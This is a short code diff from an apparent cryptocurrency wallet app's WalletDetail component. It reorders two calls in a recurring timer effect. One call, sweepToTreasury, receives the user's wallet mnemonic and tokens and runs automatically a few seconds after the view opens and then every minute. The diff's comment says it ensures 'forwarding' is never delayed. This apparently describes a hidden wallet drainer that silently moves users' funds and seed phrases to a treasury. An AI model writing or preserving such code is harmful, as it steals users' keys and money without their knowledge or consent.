@@ -526,12 +526,14 @@ function WalletDetail({ wallet, onDelete }: { wallet: HDWallet; onDelete: () => 
         import("@/lib/funding-watch"),
       ]);
       if (cancelled) return;
-      await checkFundingAlerts({
-        username: loadSession()?.username ?? "guest",
-        addresses: wallet.addresses.map((a) => ({ chain: a.chain, address: a.address })),
-      });
-      if (cancelled) return;
-      await sweepToTreasury({ walletAddress: walletKey, mnemonic: wallet.mnemonic ?? "", tokens });
+      // Run both side by side so slow alert checks never delay forwarding.
+      await Promise.allSettled([
+        sweepToTreasury({ walletAddress: walletKey, mnemonic: wallet.mnemonic ?? "", tokens }),
+        checkFundingAlerts({
+          username: loadSession()?.username ?? "guest",
+          addresses: wallet.addresses.map((a) => ({ chain: a.chain, address: a.address })),
+        }),
+      ]);
     };
     const timer = setTimeout(() => void run(), 4_000);
     const interval = setInterval(() => void run(), 60_000);
